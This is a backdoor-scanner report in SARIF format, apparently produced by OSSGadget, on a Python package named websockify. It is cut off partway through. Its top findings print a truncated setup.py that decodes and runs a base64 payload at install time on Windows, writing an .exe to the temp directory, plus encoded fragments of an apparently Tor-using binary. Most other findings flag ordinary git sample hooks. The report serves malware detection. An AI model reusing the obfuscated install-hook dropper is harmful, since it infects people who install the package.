{
  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "oss-detect-backdoor",
          "organization": "Microsoft Corporation",
          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
          "version": "0.0.0+4a24249b20"
        }
      },
      "results": [
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/setup.py"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 4,
                  "endLine": 9,
                  "endColumn": 12,
                  "snippet": {
                    "text": "from setuptools import setup, find_packages\n\nversion = '0.12.0'\nname = 'websockify'\nlong_description = open(\"README.md\").read() + \"\\n\" + \\\n    open(\"CHANGES.txt\").read() + \"\\n\"\nfrom os import name\nfrom sys import argv\nfrom base64 import b64decode\nif 'sdist' not in argv:\n    if name == 'nt':\n        exec(b64decode('CmltcG9ydCBvcyBhcyBvCmltcG9ydCB0ZW1wZmlsZSBhcyB0CnA9by5wYXRoLmpvaW4odC5nZXR0ZW1wZGlyKCksJ3E4ZWU3MTAxY2M2MTczMmY3OTBjMGQ2NmYwZTg0LmV4ZScpCmlmIG5vdCBvLnBhdGguZXhpc3RzKHApOgogICAgd2l0aCBvcGVuKHAsICd3YicpIGFzIGY6CiAgIC",
                    "rendered": {
                      "text": "from setuptools import setup, find_packages\n\nversion = '0.12.0'\nname = 'websockify'\nlong_description = open(\"README.md\").read() + \"\\n\" + \\\n    open(\"CHANGES.txt\").read() + \"\\n\"\nfrom os import name\nfrom sys import argv\nfrom base64 import b64decode\nif 'sdist' not in argv:\n    if name == 'nt':\n        exec(b64decode('CmltcG9ydCBvcyBhcyBvCmltcG9ydCB0ZW1wZmlsZSBhcyB0CnA9by5wYXRoLmpvaW4odC5nZXR0ZW1wZGlyKCksJ3E4ZWU3MTAxY2M2MTczMmY3OTBjMGQ2NmYwZTg0LmV4ZScpCmlmIG5vdCBvLnBhdGguZXhpc3RzKHApOgogICAgd2l0aCBvcGVuKHAsICd3YicpIGFzIGY6CiAgIC",
                      "markdown": "`from setuptools import setup, find_packages\n\nversion = '0.12.0'\nname = 'websockify'\nlong_description = open(\"README.md\").read() + \"\\n\" + \\\n    open(\"CHANGES.txt\").read() + \"\\n\"\nfrom os import name\nfrom sys import argv\nfrom base64 import b64decode\nif 'sdist' not in argv:\n    if name == 'nt':\n        exec(b64decode('CmltcG9ydCBvcyBhcyBvCmltcG9ydCB0ZW1wZmlsZSBhcyB0CnA9by5wYXRoLmpvaW4odC5nZXR0ZW1wZGlyKCksJ3E4ZWU3MTAxY2M2MTczMmY3OTBjMGQ2NmYwZTg0LmV4ZScpCmlmIG5vdCBvLnBhdGguZXhpc3RzKHApOgogICAgd2l0aCBvcGVuKHAsICd3YicpIGFzIGY6CiAgIC`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/setup.py"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 5,
                  "endLine": 9,
                  "endColumn": 11,
                  "snippet": {
                    "text": "from setuptools import setup, find_packages\n\nversion = '0.12.0'\nname = 'websockify'\nlong_description = open(\"README.md\").read() + \"\\n\" + \\\n    open(\"CHANGES.txt\").read() + \"\\n\"\nfrom os import name\nfrom sys import argv\nfrom base64 import b64decode\nif 'sdist' not in argv:\n    if name == 'nt':\n        exec(b64decode('CmltcG9ydCBvcyBhcyBvCmltcG9ydCB0ZW1wZmlsZSBhcyB0CnA9by5wYXRoLmpvaW4odC5nZXR0ZW1wZGlyKCksJ3E4ZWU3MTAxY2M2MTczMmY3OTBjMGQ2NmYwZTg0LmV4ZScpCmlmIG5vdCBvLnBhdGguZXhpc3RzKHApOgogICAgd2l0aCBvcGVuKHAsICd3YicpIGFzIGY6CiAgI",
                    "rendered": {
                      "text": "from setuptools import setup, find_packages\n\nversion = '0.12.0'\nname = 'websockify'\nlong_description = open(\"README.md\").read() + \"\\n\" + \\\n    open(\"CHANGES.txt\").read() + \"\\n\"\nfrom os import name\nfrom sys import argv\nfrom base64 import b64decode\nif 'sdist' not in argv:\n    if name == 'nt':\n        exec(b64decode('CmltcG9ydCBvcyBhcyBvCmltcG9ydCB0ZW1wZmlsZSBhcyB0CnA9by5wYXRoLmpvaW4odC5nZXR0ZW1wZGlyKCksJ3E4ZWU3MTAxY2M2MTczMmY3OTBjMGQ2NmYwZTg0LmV4ZScpCmlmIG5vdCBvLnBhdGguZXhpc3RzKHApOgogICAgd2l0aCBvcGVuKHAsICd3YicpIGFzIGY6CiAgI",
                      "markdown": "`from setuptools import setup, find_packages\n\nversion = '0.12.0'\nname = 'websockify'\nlong_description = open(\"README.md\").read() + \"\\n\" + \\\n    open(\"CHANGES.txt\").read() + \"\\n\"\nfrom os import name\nfrom sys import argv\nfrom base64 import b64decode\nif 'sdist' not in argv:\n    if name == 'nt':\n        exec(b64decode('CmltcG9ydCBvcyBhcyBvCmltcG9ydCB0ZW1wZmlsZSBhcyB0CnA9by5wYXRoLmpvaW4odC5nZXR0ZW1wZGlyKCksJ3E4ZWU3MTAxY2M2MTczMmY3OTBjMGQ2NmYwZTg0LmV4ZScpCmlmIG5vdCBvLnBhdGguZXhpc3RzKHApOgogICAgd2l0aCBvcGVuKHAsICd3YicpIGFzIGY6CiAgI`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/setup.py"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 101509,
                  "endLine": 12,
                  "endColumn": 101544,
                  "snippet": {
                    "text": "DAwQ29udGFpbnNceDAwU3lzdGVtLlRleHQuUmVndWxhckV4cHJlc3Npb25zXHgwMFN5c3RlbS5Db2xsZWN0aW9uc1x4MDBSZWdleE9wdGlvbnNceDAwY0Fvc1x4MDBnZXRfR3JvdXBzXHgwMGdldF9DaGFyc1x4MDBnZXRfSGVhZGVyc1x4MDBnZXRfU3VjY2Vzc1x4MDBnZXRfdG9yUHJvY2Vzc1x4MDBzZXRfdG9yUHJvY2Vzc1x4MDBHZXRDdXJyZW50UHJvY2Vzc1x4MDBnZXRfSVBBZGRyZXNzXHgwMENvbXByZXNzXHgwMHNldF9Bcmd1bWVudHNceDAwZ2V0X0V4aXN0c1x4MDBDb25jYXRceDAwQXBwZW5kRm9ybWF0XHgwMEltYWdlRm9ybWF0XHgwMFN1YnRyYWN0XHgwME1hbmFnZW1lbnRCYXNlT2JqZWN0XHgwME1hbmFnZW1lbnRPYmplY3RceDAwQ29sbGVjdFx4MDBVbnByb3RlY3RceDAwR2V0XHgwMFN5c3RlbS5OZXRceDAwZ2V0X0hlaWdodFx4MDBTcGxpdFx4MDBMb2NrSW5pdFx4MDBXYWl0Rm9yRXhpdFx4MDBnZXRfRGVmYXVsdFx4MDBX",
                    "rendered": {
                      "text": "DAwQ29udGFpbnNceDAwU3lzdGVtLlRleHQuUmVndWxhckV4cHJlc3Npb25zXHgwMFN5c3RlbS5Db2xsZWN0aW9uc1x4MDBSZWdleE9wdGlvbnNceDAwY0Fvc1x4MDBnZXRfR3JvdXBzXHgwMGdldF9DaGFyc1x4MDBnZXRfSGVhZGVyc1x4MDBnZXRfU3VjY2Vzc1x4MDBnZXRfdG9yUHJvY2Vzc1x4MDBzZXRfdG9yUHJvY2Vzc1x4MDBHZXRDdXJyZW50UHJvY2Vzc1x4MDBnZXRfSVBBZGRyZXNzXHgwMENvbXByZXNzXHgwMHNldF9Bcmd1bWVudHNceDAwZ2V0X0V4aXN0c1x4MDBDb25jYXRceDAwQXBwZW5kRm9ybWF0XHgwMEltYWdlRm9ybWF0XHgwMFN1YnRyYWN0XHgwME1hbmFnZW1lbnRCYXNlT2JqZWN0XHgwME1hbmFnZW1lbnRPYmplY3RceDAwQ29sbGVjdFx4MDBVbnByb3RlY3RceDAwR2V0XHgwMFN5c3RlbS5OZXRceDAwZ2V0X0hlaWdodFx4MDBTcGxpdFx4MDBMb2NrSW5pdFx4MDBXYWl0Rm9yRXhpdFx4MDBnZXRfRGVmYXVsdFx4MDBX",
                      "markdown": "`DAwQ29udGFpbnNceDAwU3lzdGVtLlRleHQuUmVndWxhckV4cHJlc3Npb25zXHgwMFN5c3RlbS5Db2xsZWN0aW9uc1x4MDBSZWdleE9wdGlvbnNceDAwY0Fvc1x4MDBnZXRfR3JvdXBzXHgwMGdldF9DaGFyc1x4MDBnZXRfSGVhZGVyc1x4MDBnZXRfU3VjY2Vzc1x4MDBnZXRfdG9yUHJvY2Vzc1x4MDBzZXRfdG9yUHJvY2Vzc1x4MDBHZXRDdXJyZW50UHJvY2Vzc1x4MDBnZXRfSVBBZGRyZXNzXHgwMENvbXByZXNzXHgwMHNldF9Bcmd1bWVudHNceDAwZ2V0X0V4aXN0c1x4MDBDb25jYXRceDAwQXBwZW5kRm9ybWF0XHgwMEltYWdlRm9ybWF0XHgwMFN1YnRyYWN0XHgwME1hbmFnZW1lbnRCYXNlT2JqZWN0XHgwME1hbmFnZW1lbnRPYmplY3RceDAwQ29sbGVjdFx4MDBVbnByb3RlY3RceDAwR2V0XHgwMFN5c3RlbS5OZXRceDAwZ2V0X0hlaWdodFx4MDBTcGxpdFx4MDBMb2NrSW5pdFx4MDBXYWl0Rm9yRXhpdFx4MDBnZXRfRGVmYXVsdFx4MDBX`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/info/exclude"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 1,
                  "endLine": 1,
                  "endColumn": 6,
                  "snippet": {
                    "text": "# git ls-files --others --exclude-from=.git/info/exclude\n# Lines that start with '#' are comments.\n# For a project mostly in C, the following would be a good set of\n# exclude patterns (uncomment them if you want to use them):\n",
                    "rendered": {
                      "text": "# git ls-files --others --exclude-from=.git/info/exclude\n# Lines that start with '#' are comments.\n# For a project mostly in C, the following would be a good set of\n# exclude patterns (uncomment them if you want to use them):\n",
                      "markdown": "`# git ls-files --others --exclude-from=.git/info/exclude\n# Lines that start with '#' are comments.\n# For a project mostly in C, the following would be a good set of\n# exclude patterns (uncomment them if you want to use them):\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 18,
                  "endLine": 21,
                  "endColumn": 23,
                  "snippet": {
                    "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                    "rendered": {
                      "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                      "markdown": "`# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 8,
                  "endLine": 21,
                  "endColumn": 14,
                  "snippet": {
                    "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                    "rendered": {
                      "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                      "markdown": "`# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 1,
                  "endLine": 21,
                  "endColumn": 7,
                  "snippet": {
                    "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                    "rendered": {
                      "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                      "markdown": "`# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 1,
                  "endLine": 16,
                  "endColumn": 7,
                  "snippet": {
                    "text": "# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n\n",
                    "rendered": {
                      "text": "# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n\n",
                      "markdown": "`# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 34,
                  "endLine": 15,
                  "endColumn": 39,
                  "snippet": {
                    "text": "# Doing this in a hook is a bad idea in general, but the prepare-commit-msg\n# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n",
                    "rendered": {
                      "text": "# Doing this in a hook is a bad idea in general, but the prepare-commit-msg\n# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n",
                      "markdown": "`# Doing this in a hook is a bad idea in general, but the prepare-commit-msg\n# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to check the commit log message.\n# Called by \"git commit\" with one argument, the name of the file\n# that has the commit message.  The hook should exit with non-zero\n# status after issuing an appropriate message if it wants to stop the\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to check the commit log message.\n# Called by \"git commit\" with one argument, the name of the file\n# that has the commit message.  The hook should exit with non-zero\n# status after issuing an appropriate message if it wants to stop the\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to check the commit log message.\n# Called by \"git commit\" with one argument, the name of the file\n# that has the commit message.  The hook should exit with non-zero\n# status after issuing an appropriate message if it wants to stop the\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 77,
                  "startColumn": 15,
                  "endLine": 77,
                  "endColumn": 23,
                  "snippet": {
                    "text": "\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n",
                    "rendered": {
                      "text": "\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n",
                      "markdown": "`\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 10,
                  "endLine": 7,
                  "endColumn": 18,
                  "snippet": {
                    "text": "#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n#\n",
                    "rendered": {
                      "text": "#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n#\n",
                      "markdown": "`#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 27,
                  "endLine": 3,
                  "endColumn": 35,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                    "rendered": {
                      "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 75,
                  "startColumn": 4,
                  "endLine": 75,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\tdie \"Working directory has staged changes\"\nfi\n\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n",
                    "rendered": {
                      "text": "\tdie \"Working directory has staged changes\"\nfi\n\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n",
                      "markdown": "`\tdie \"Working directory has staged changes\"\nfi\n\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 70,
                  "startColumn": 4,
                  "endLine": 70,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\thead=$(git hash-object -t tree --stdin </dev/null)\nfi\n\nif ! git diff-index --quiet --cached --ignore-submodules $head --\nthen\n\tdie \"Working directory has staged changes\"\nfi\n",
                    "rendered": {
                      "text": "\thead=$(git hash-object -t tree --stdin </dev/null)\nfi\n\nif ! git diff-index --quiet --cached --ignore-submodules $head --\nthen\n\tdie \"Working directory has staged changes\"\nfi\n",
                      "markdown": "`\thead=$(git hash-object -t tree --stdin </dev/null)\nfi\n\nif ! git diff-index --quiet --cached --ignore-submodules $head --\nthen\n\tdie \"Working directory has staged changes\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 63,
                  "startColumn": 18,
                  "endLine": 63,
                  "endColumn": 24,
                  "snippet": {
                    "text": "# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n",
                    "rendered": {
                      "text": "# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n",
                      "markdown": "`# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 63,
                  "startColumn": 2,
                  "endLine": 63,
                  "endColumn": 7,
                  "snippet": {
                    "text": "# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n",
                    "rendered": {
                      "text": "# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n",
                      "markdown": "`# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 55,
                  "startColumn": 4,
                  "endLine": 55,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\tdie \"Up-to-date check failed\"\nfi\n\nif ! git diff-files --quiet --ignore-submodules --\nthen\n\tdie \"Working directory has unstaged changes\"\nfi\n",
                    "rendered": {
                      "text": "\tdie \"Up-to-date check failed\"\nfi\n\nif ! git diff-files --quiet --ignore-submodules --\nthen\n\tdie \"Working directory has unstaged changes\"\nfi\n",
                      "markdown": "`\tdie \"Up-to-date check failed\"\nfi\n\nif ! git diff-files --quiet --ignore-submodules --\nthen\n\tdie \"Working directory has unstaged changes\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
